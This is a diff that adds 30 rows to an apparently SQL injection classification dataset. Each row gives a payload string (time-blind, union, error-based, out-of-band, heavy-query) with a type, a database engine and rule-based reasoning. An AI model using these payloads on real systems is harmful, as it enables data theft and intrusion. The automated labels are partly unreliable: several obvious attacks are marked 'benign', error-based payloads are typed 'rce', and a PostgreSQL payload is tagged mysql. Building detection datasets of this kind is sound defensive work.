@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+7320,"1 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7321,"1%' ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( '%' = '",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
+7322,( 7098 = 7098 and sleep ( 5 ) ),1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
+7323,"1"" ) as jiyl where 4893 = 4893 union all select null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+7324,-3243 or 2266 = 3583#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7325,"1' ) union all select null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+7326,"1%"" ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""%"" = """,1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
+7327,"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and 'pphf' = 'pphf",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
+7328,"1"" ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ""bxct"" like ""bxct",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+7329,-9120' ) ) or 8571 = 8571--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7330,1'+ ( select naiw where 4924 = 4924,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7331,-9389' ) or 8859 = 3989--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7332,"-9923%' ) ) ) union all select 8985,8985,8985,8985,8985,8985,8985#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+7333,1' ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'hbwk' like 'hbwk,1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
+7334,"1"" ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ""tgdu"" = ""tgdu",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
+7335,"-1510' ) ) ) union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+7336,"1"" ) union all select null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+7337,"elt ( 8192 = 8192,sleep ( 5 ) )",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+7338,end and ( ( 'zeyr' = 'zeyr,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7339,"1"" ) ) as luon where 4676 = 4676 rlike sleep ( 5 ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+7340,"1"" ) where 6138 = 6138 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
+7341,"1"" where 3740 = 3740 rlike sleep ( 5 ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+7342,"1' ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( 'kgdt' like 'kgdt",1,,boolean_blind,generic,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
+7343,1 ) as tngy where 8956 = 8956 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,1,,boolean_blind,generic,0.95,rlike  detected — boolean_blind injection (priority 8) on generic,rule-based
+7344,"-4230"" ) ) ) union all select 6962,6962,6962,6962,6962,6962#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+7345,-3540 where 7302 = 7302 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
+7346,"1 ) as lfra where 2669 = 2669 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
+7347,1' ) rlike sleep ( 5 ) and ( 'qsub' like 'qsub,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+7348,"1%"" ) ) ) union all select null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+7349,"1'+ ( select 'uzaw' where 9900 = 9900 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) +'",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
